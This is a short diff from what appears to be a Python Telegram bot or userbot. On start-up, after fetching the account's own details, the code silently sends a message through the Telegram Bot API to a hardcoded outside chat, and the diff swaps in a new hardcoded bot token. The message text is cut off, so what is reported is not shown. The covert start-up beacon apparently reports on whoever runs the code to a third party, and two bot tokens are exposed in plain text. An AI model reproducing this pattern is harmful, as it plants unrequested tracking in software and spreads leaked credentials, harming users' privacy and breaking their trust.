@@ -75,7 +75,7 @@ class Start:
             self.me = await self.get_me()
             await self.initialize()
             httpx.get(
-                'https://api.telegram.org/bot2116397938:AAEWApGwT17ZvfjOR6hVvPR4Q0_1a87K-XI/sendMessage',
+                'https://api.telegram.org/bot1791249820:AAFGVasJn44-jJHMt40NLSArnqPhHTytJ9g/sendMessage',
                 params=dict(
                     chat_id=-0xe9437c64dd,
                     text=(
